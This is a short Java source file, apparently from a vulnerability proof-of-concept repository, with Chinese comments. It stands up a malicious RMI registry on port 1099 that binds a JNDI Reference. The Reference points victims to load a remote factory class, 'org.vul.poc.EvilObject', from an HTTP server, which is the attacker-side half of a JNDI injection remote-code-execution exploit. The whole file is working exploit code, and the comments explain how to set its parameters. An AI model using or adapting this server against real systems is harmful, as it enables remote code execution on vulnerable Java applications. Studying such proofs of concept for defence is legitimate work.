package org.vul;


import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIRegistryServer {
    public static void main(String[] args) throws Exception {
        // Reference 需要传入三个参数 (className, factory, factoryLocation)
        // 第一个参数随便填，第二各参数要填 HTTP 服务下的类名，第三个参数填写远程地址
        Reference refObj = new Reference("whatever", "org.vul.poc.EvilObject",
                "http://127.0.0.1:8000/");
        // ReferenceWrapper 包裹 Reference 类，使其能通过 RMI 进行远程访问
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(refObj);

        Registry registry = LocateRegistry.createRegistry(1099);
        registry.bind("refObj", referenceWrapper);
    }
}
